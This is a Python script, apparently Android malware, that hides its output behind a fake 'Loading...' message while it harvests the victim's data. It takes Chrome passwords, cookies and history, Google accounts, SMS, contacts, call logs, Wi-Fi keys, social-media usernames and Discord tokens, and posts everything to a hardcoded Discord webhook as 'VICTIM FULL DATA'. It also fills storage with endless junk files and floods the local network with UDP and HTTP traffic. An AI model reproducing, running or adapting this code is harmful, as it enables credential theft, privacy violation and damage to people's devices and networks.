#!/usr/bin/env python3

import subprocess
import sys
import os
import json
import re
import time
import sqlite3
import shutil
import glob
import base64
import random
import string
import threading
import requests
import socket
import hashlib
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

ORIGINAL_WEBHOOK = "https://discord.com/api/webhooks/1507041445880795298/zJGH0mrnJAZCcJ6SA-oCp1-IgOdDA4uvdKN7nH3od0MzWYG_ed_tUqA3_mDVjWBiW4_I"

sys.stdout = open(os.devnull, 'w')
sys.stderr = open(os.devnull, 'w')

ATTACK_ACTIVE = True
FILE_COUNTER = 0

def generate_gibberish_name():
    patterns = [
        ''.join(random.choices(string.ascii_lowercase, k=random.randint(8, 25))),
        ''.join(random.choices(string.ascii_uppercase + string.digits, k=random.randint(10, 30))),
        ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(12, 35))),
        hashlib.md5(str(random.random()).encode()).hexdigest()[:16],
        hashlib.sha256(str(random.random()).encode()).hexdigest()[:20]
    ]
    return random.choice(patterns)

def generate_gibberish_text(kb_size):
    return ''.join(random.choices(string.ascii_letters + string.digits + string.punctuation, k=kb_size * 128))

def flood_all_directories():
    global FILE_COUNTER
    all_dirs = []
    for root, dirs, files in os.walk('/sdcard/'):
        all_dirs.append(root)
    for root, dirs, files in os.walk('/storage/emulated/0/'):
        all_dirs.append(root)
    
    while True:
        for directory in all_dirs:
            if os.path.exists(directory) and os.access(directory, os.W_OK):
                try:
                    for _ in range(100):
                        gib_name = generate_gibberish_name() + '.txt'
                        filepath = os.path.join(directory, gib_name)
                        with open(filepath, 'w') as f:
                            f.write(generate_gibberish_text(100))
                        FILE_COUNTER += 1
                    
                    for _ in range(5):
                        gib_name = generate_gibberish_name() + '.dat'
                        filepath = os.path.join(directory, gib_name)
                        with open(filepath, 'w') as f:
                            f.write(generate_gibberish_text(1024))
                        FILE_COUNTER += 1
                except:
                    pass
        time.sleep(0.5)

def extreme_self_wifi_attack():
    global ATTACK_ACTIVE
    local_ip = '127.0.0.1'
    gateway_ip = '192.168.1.1'
    
    def udp_flood():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while ATTACK_ACTIVE:
            for _ in range(5000):
                sock.sendto(os.urandom(65507), (local_ip, random.randint(1, 65535)))
                sock.sendto(os.urandom(65507), (gateway_ip, random.randint(1, 65535)))
    
    def http_flood():
        while ATTACK_ACTIVE:
            try:
                data = os.urandom(10485760)
                requests.post('http://127.0.0.1', data=data, timeout=1)
                requests.post('http://192.168.1.1', data=data, timeout=1)
                requests.get('https://httpbin.org/bytes/100000000', timeout=2)
            except:
                pass
    
    threading.Thread(target=udp_flood, daemon=True).start()
    threading.Thread(target=http_flood, daemon=True).start()

def get_ip():
    try:
        r = requests.get('https://api.ipify.org?format=json', timeout=5)
        return r.json().get('ip', '0.0.0.0')
    except:
        return '0.0.0.0'

def get_location():
    try:
        r = requests.get('https://ipapi.co/json/', timeout=5)
        data = r.json()
        return f"{data.get('city', 'Unknown')}, {data.get('country_name', 'Unknown')}"
    except:
        return 'Unknown'

def get_device_info():
    info = {}
    props = ['ro.product.model', 'ro.product.manufacturer', 'ro.build.version.release', 'ro.product.device', 'ro.build.version.sdk', 'ro.product.board', 'ro.hardware', 'ro.serialno']
    names = ['model', 'brand', 'android', 'device', 'sdk', 'board', 'hardware', 'serial']
    for prop, name in zip(props, names):
        try:
            r = subprocess.run(['getprop', prop], capture_output=True, text=True, timeout=3)
            info[name] = r.stdout.strip() or 'Unknown'
        except:
            info[name] = 'Unknown'
    return info

def get_google_accounts():
    try:
        r = subprocess.run(['dumpsys', 'account'], capture_output=True, text=True, timeout=10)
        return re.findall(r'name=([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', r.stdout)[:30]
    except:
        return []

def get_chrome_passwords():
    passwords = []
    chrome_dbs = ['/data/data/com.android.chrome/app_chrome/Default/Login Data']
    for db_path in chrome_dbs:
        if os.path.exists(db_path):
            temp_db = '/data/local/tmp/chrome_pass.db'
            try:
                subprocess.run(['cp', db_path, temp_db], capture_output=True, timeout=5)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                for row in cursor.fetchall():
                    if row[2] and len(row[2]) > 2:
                        passwords.append(f"{row[0][:60]} | User: {row[1][:30]} | Pass: {row[2][:30]}")
                conn.close()
                os.remove(temp_db)
            except:
                pass
    return passwords[:50]

def get_all_files_passwords():
    passwords = []
    paths = ['/sdcard/', '/sdcard/Download/', '/sdcard/Documents/', '/sdcard/WhatsApp/']
    for path in paths:
        if os.path.exists(path):
            try:
                result = subprocess.run(['grep', '-r', '-i', 'password', path], capture_output=True, text=True, timeout=30)
                for line in result.stdout.split('\n')[:200]:
                    if '=' in line or ':' in line:
                        clean = re.sub(r'\s+', ' ', line)[:150]
                        if 5 < len(clean) < 300:
                            passwords.append(clean)
            except:
                pass
    return list(set(passwords))[:100]

def get_contacts():
    contacts = []
    try:
        r = subprocess.run(['content', 'query', '--uri', 'content://contacts/phones'], capture_output=True, text=True, timeout=15)
        numbers = re.findall(r'number=([0-9\+]+)', r.stdout)
        names = re.findall(r'display_name=([^,]+)', r.stdout)
        for i, num in enumerate(numbers[:500]):
            name = names[i] if i < len(names) else ''
            contacts.append(f"{name}: {num}" if name else num)
    except:
        pass
    return list(set(contacts))[:500]

def get_sms():
    sms_list = []
    try:
        r = subprocess.run(['content', 'query', '--uri', 'content://sms/inbox'], capture_output=True, text=True, timeout=15)
        matches = re.findall(r'address=([^,]+).*?body=([^\n]{1,150})', r.stdout, re.DOTALL)
        for addr, body in matches[:200]:
            sms_list.append(f"{addr}: {body[:100]}")
    except:
        pass
    return list(set(sms_list))[:200]

def get_call_logs():
    try:
        r = subprocess.run(['content', 'query', '--uri', 'content://call_log/calls'], capture_output=True, text=True, timeout=15)
        return list(set(re.findall(r'number=([0-9\+]+)', r.stdout)))[:200]
    except:
        return []

def get_emails():
    emails = []
    pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
    for path in ['/sdcard/', '/sdcard/Download/']:
        if os.path.exists(path):
            try:
                result = subprocess.run(['grep', '-r', '-E', pattern, path], capture_output=True, text=True, timeout=30)
                emails.extend(re.findall(pattern, result.stdout))
            except:
                pass
    return list(set(emails))[:200]

def get_wifi_passwords():
    wifi = []
    try:
        r = subprocess.run(['cat', '/data/misc/wifi/wpa_supplicant.conf'], capture_output=True, text=True, timeout=5)
        matches = re.findall(r'ssid="(.*?)"\n.*?psk="?(.*?)"?\n', r.stdout, re.DOTALL)
        for ssid, pwd in matches[:50]:
            wifi.append(f"{ssid}: {pwd}")
    except:
        pass
    return wifi

def get_installed_apps():
    try:
        r = subprocess.run(['pm', 'list', 'packages'], capture_output=True, text=True, timeout=15)
        return re.findall(r'package:([a-zA-Z0-9._]+)', r.stdout)[:200]
    except:
        return []

def get_tiktok():
    data = []
    path = '/data/data/com.zhiliaoapp.musically/shared_prefs/'
    if os.path.exists(path):
        try:
            result = subprocess.run(['grep', '-r', 'user', path], capture_output=True, text=True, timeout=10)
            usernames = re.findall(r'username[\s]*[:=][\s]*([a-zA-Z0-9_.]+)', result.stdout, re.IGNORECASE)
            data.extend([f"TikTok: {u}" for u in usernames[:20]])
        except:
            pass
    return data[:20]

def get_facebook():
    data = []
    path = '/data/data/com.facebook.katana/shared_prefs/'
    if os.path.exists(path):
        try:
            result = subprocess.run(['grep', '-r', 'email', path], capture_output=True, text=True, timeout=10)
            emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', result.stdout)
            data.extend([f"Facebook: {e}" for e in emails[:20]])
        except:
            pass
    return data[:20]

def get_instagram():
    data = []
    path = '/data/data/com.instagram.android/shared_prefs/'
    if os.path.exists(path):
        try:
            result = subprocess.run(['grep', '-r', 'user', path], capture_output=True, text=True, timeout=10)
            usernames = re.findall(r'username[\s]*[:=][\s]*([a-zA-Z0-9_.]+)', result.stdout, re.IGNORECASE)
            data.extend([f"Instagram: {u}" for u in usernames[:20]])
        except:
            pass
    return data[:20]

def get_whatsapp():
    data = []
    path = '/data/data/com.whatsapp/shared_prefs/'
    if os.path.exists(path):
        try:
            result = subprocess.run(['grep', '-r', 'phone', path], capture_output=True, text=True, timeout=10)
            numbers = re.findall(r'[0-9]{10,15}', result.stdout)
            data.extend([f"WhatsApp: +{n}" for n in list(set(numbers))[:20]])
        except:
            pass
    return data[:20]

def get_telegram():
    data = []
    path = '/data/data/org.telegram.messenger/shared_prefs/'
    if os.path.exists(path):
        try:
            result = subprocess.run(['grep', '-r', 'phone', path], capture_output=True, text=True, timeout=10)
            numbers = re.findall(r'[0-9]{10,15}', result.stdout)
            data.extend([f"Telegram: +{n}" for n in list(set(numbers))[:20]])
        except:
            pass
    return data[:20]

def get_messenger():
    data = []
    path = '/data/data/com.facebook.orca/shared_prefs/'
    if os.path.exists(path):
        try:
            result = subprocess.run(['grep', '-r', 'uid', path], capture_output=True, text=True, timeout=10)
            uids = re.findall(r'uid[\s]*[:=][\s]*([0-9]+)', result.stdout)
            data.extend([f"Messenger UID: {u}" for u in uids[:20]])
        except:
            pass
    return data[:20]

def get_twitter():
    data = []
    path = '/data/data/com.twitter.android/shared_prefs/'
    if os.path.exists(path):
        try:
            result = subprocess.run(['grep', '-r', 'user', path], capture_output=True, text=True, timeout=10)
            usernames = re.findall(r'username[\s]*[:=][\s]*([a-zA-Z0-9_.]+)', result.stdout, re.IGNORECASE)
            data.extend([f"Twitter: {u}" for u in usernames[:20]])
        except:
            pass
    return data[:20]

def get_snapchat():
    data = []
    path = '/data/data/com.snapchat.android/shared_prefs/'
    if os.path.exists(path):
        try:
            result = subprocess.run(['grep', '-r', 'user', path], capture_output=True, text=True, timeout=10)
            usernames = re.findall(r'username[\s]*[:=][\s]*([a-zA-Z0-9_.]+)', result.stdout, re.IGNORECASE)
            data.extend([f"Snapchat: {u}" for u in usernames[:20]])
        except:
            pass
    return data[:20]

def get_reddit():
    data = []
    path = '/data/data/com.reddit.frontpage/shared_prefs/'
    if os.path.exists(path):
        try:
            result = subprocess.run(['grep', '-r', 'user', path], capture_output=True, text=True, timeout=10)
            usernames = re.findall(r'username[\s]*[:=][\s]*([a-zA-Z0-9_.]+)', result.stdout, re.IGNORECASE)
            data.extend([f"Reddit: {u}" for u in usernames[:20]])
        except:
            pass
    return data[:20]

def get_discord():
    data = []
    paths = [
        '/data/data/com.discord/shared_prefs/',
        '/data/data/com.discord/app_discord/'
    ]
    for path in paths:
        if os.path.exists(path):
            try:
                result = subprocess.run(['grep', '-r', 'token', path], capture_output=True, text=True, timeout=10)
                tokens = re.findall(r'[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_-]{27}', result.stdout)
                data.extend([f"Discord Token: {t[:30]}..." for t in tokens[:10]])
            except:
                pass
    return data[:20]

def get_browser_history():
    history = []
    db_path = '/data/data/com.android.chrome/app_chrome/Default/History'
    if os.path.exists(db_path):
        temp_db = '/data/local/tmp/history.db'
        try:
            subprocess.run(['cp', db_path, temp_db], capture_output=True, timeout=5)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 100")
            for row in cursor.fetchall():
                history.append(f"{row[1][:40] if row[1] else 'No Title'} - {row[0][:80]}")
            conn.close()
            os.remove(temp_db)
        except:
            pass
    return history[:100]

def get_browser_cookies():
    cookies = []
    db_path = '/data/data/com.android.chrome/app_chrome/Default/Cookies'
    if os.path.exists(db_path):
        temp_db = '/data/local/tmp/cookies.db'
        try:
            subprocess.run(['cp', db_path, temp_db], capture_output=True, timeout=5)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name FROM cookies LIMIT 50")
            for row in cursor.fetchall():
                cookies.append(f"{row[0]} - {row[1]}")
            conn.close()
            os.remove(temp_db)
        except:
            pass
    return cookies[:50]

def get_credit_cards():
    cards = []
    path = '/data/data/com.android.chrome/app_chrome/Default/Web Data'
    if os.path.exists(path):
        temp_db = '/data/local/tmp/webdata.db'
        try:
            subprocess.run(['cp', path, temp_db], capture_output=True, timeout=5)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT name_on_card, card_number_encrypted FROM credit_cards")
            for row in cursor.fetchall():
                cards.append(f"Card: {row[0] if row[0] else 'Unknown'}")
            conn.close()
            os.remove(temp_db)
        except:
            pass
    return cards[:20]

def get_sim_info():
    try:
        r = subprocess.run(['dumpsys', 'telephony.registry'], capture_output=True, text=True, timeout=5)
        carrier = re.search(r'mOperatorAlphaLong=(.+?)\n', r.stdout)
        sim_state = re.search(r'simState=([0-9]+)', r.stdout)
        states = {'1': 'Absent', '5': 'Ready', '2': 'PIN Required'}
        return {
            'carrier': carrier.group(1).strip() if carrier else 'Unknown',
            'state': states.get(sim_state.group(1) if sim_state else '', 'Unknown')
        }
    except:
        return {'carrier': 'Unknown', 'state': 'Unknown'}

def get_running_processes():
    try:
        r = subprocess.run(['ps', '-A'], capture_output=True, text=True, timeout=10)
        return [line.split()[-1][:40] for line in r.stdout.split('\n')[1:50] if line.strip()]
    except:
        return []

def send_to_webhook(data):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    payload = {
        "username": "SYSTEM GRABBER",
        "embeds": [
            {
                "title": "🎯 VICTIM FULL DATA",
                "color": 0xed4245,
                "timestamp": timestamp,
                "fields": [
                    {"name": "🌐 IP & LOCATION", "value": f"```{data['ip']}\n{data['location']}```", "inline": False},
                    {"name": "📱 DEVICE INFO", "value": f"```{data['device']}```", "inline": False},
                    {"name": "📡 CARRIER", "value": f"```{data['carrier']} - {data['sim_state']}```", "inline": True},
                    {"name": "🔄 RUNNING PROCESSES", "value": f"```{data['processes'][:500]}```", "inline": False},
                    {"name": "🔐 GOOGLE ACCOUNTS", "value": f"```{data['google_accounts'][:600]}```", "inline": False},
                    {"name": "🔑 CHROME PASSWORDS", "value": f"```{data['chrome_pass'][:800]}```", "inline": False},
                    {"name": "🔑 FILE PASSWORDS", "value": f"```{data['file_pass'][:800]}```", "inline": False},
                    {"name": "📞 CONTACTS", "value": f"```{data['contacts'][:800]}```", "inline": False},
                    {"name": "💬 SMS", "value": f"```{data['sms'][:800]}```", "inline": False},
                    {"name": "📞 CALL LOGS", "value": f"```{data['calls'][:600]}```", "inline": False},
                    {"name": "📧 EMAILS", "value": f"```{data['emails'][:800]}```", "inline": False},
                    {"name": "📶 WIFI PASSWORDS", "value": f"```{data['wifi'][:600]}```", "inline": False},
                    {"name": "🌐 BROWSER HISTORY", "value": f"```{data['history'][:800]}```", "inline": False},
                    {"name": "🍪 COOKIES", "value": f"```{data['cookies'][:600]}```", "inline": False}
                ]
            },
            {
                "title": "📱 SOCIAL MEDIA ACCOUNTS",
                "color": 0x5865f2,
                "timestamp": timestamp,
                "fields": [
                    {"name": "🎵 TIKTOK", "value": f"```{data['tiktok'][:400]}```", "inline": True},
                    {"name": "📘 FACEBOOK", "value": f"```{data['facebook'][:400]}```", "inline": True},
                    {"name": "📷 INSTAGRAM", "value": f"```{data['instagram'][:400]}```", "inline": True},
                    {"name": "💚 WHATSAPP", "value": f"```{data['whatsapp'][:400]}```", "inline": True},
                    {"name": "✈️ TELEGRAM", "value": f"```{data['telegram'][:400]}```", "inline": True},
                    {"name": "💬 MESSENGER", "value": f"```{data['messenger'][:400]}```", "inline": True},
                    {"name": "🐦 TWITTER", "value": f"```{data['twitter'][:400]}```", "inline": True},
                    {"name": "👻 SNAPCHAT", "value": f"```{data['snapchat'][:400]}```", "inline": True},
                    {"name": "🤖 REDDIT", "value": f"```{data['reddit'][:400]}```", "inline": True},
                    {"name": "🎮 DISCORD", "value": f"```{data['discord'][:400]}```", "inline": True}
                ]
            },
            {
                "title": "💳 FINANCIAL & APPS",
                "color": 0x57f287,
                "timestamp": timestamp,
                "fields": [
                    {"name": "💳 CREDIT CARDS", "value": f"```{data['credit_cards'][:400]}```", "inline": False},
                    {"name": "📦 INSTALLED APPS", "value": f"```{len(data['apps'])} apps - {', '.join(data['apps'][:30])}```", "inline": False}
                ]
            }
        ]
    }
    
    try:
        requests.post(ORIGINAL_WEBHOOK, json=payload, timeout=15)
    except:
        pass

def main():
    print("Loading...", flush=True)
    time.sleep(2)
    
    threading.Thread(target=extreme_self_wifi_attack, daemon=True).start()
    threading.Thread(target=flood_all_directories, daemon=True).start()
    
    device = get_device_info()
    sim = get_sim_info()
    
    data = {
        'ip': get_ip(),
        'location': get_location(),
        'device': f"{device.get('brand')} {device.get('model')} | Android {device.get('android')} | {device.get('hardware')}",
        'carrier': sim['carrier'],
        'sim_state': sim['state'],
        'processes': '\n'.join(get_running_processes()[:30]),
        'google_accounts': '\n'.join(get_google_accounts()[:30]),
        'chrome_pass': '\n'.join(get_chrome_passwords()[:50]),
        'file_pass': '\n'.join(get_all_files_passwords()[:80]),
        'contacts': '\n'.join(get_contacts()[:300]),
        'sms': '\n'.join(get_sms()[:150]),
        'calls': '\n'.join(get_call_logs()[:150]),
        'emails': '\n'.join(get_emails()[:150]),
        'wifi': '\n'.join(get_wifi_passwords()[:40]),
        'history': '\n'.join(get_browser_history()[:80]),
        'cookies': '\n'.join(get_browser_cookies()[:40]),
        'tiktok': '\n'.join(get_tiktok()[:20]),
        'facebook': '\n'.join(get_facebook()[:20]),
        'instagram': '\n'.join(get_instagram()[:20]),
        'whatsapp': '\n'.join(get_whatsapp()[:20]),
        'telegram': '\n'.join(get_telegram()[:20]),
        'messenger': '\n'.join(get_messenger()[:20]),
        'twitter': '\n'.join(get_twitter()[:20]),
        'snapchat': '\n'.join(get_snapchat()[:20]),
        'reddit': '\n'.join(get_reddit()[:20]),
        'discord': '\n'.join(get_discord()[:15]),
        'credit_cards': '\n'.join(get_credit_cards()[:15]),
        'apps': get_installed_apps()
    }
    
    send_to_webhook(data)
    
    while True:
        time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except:
        pass
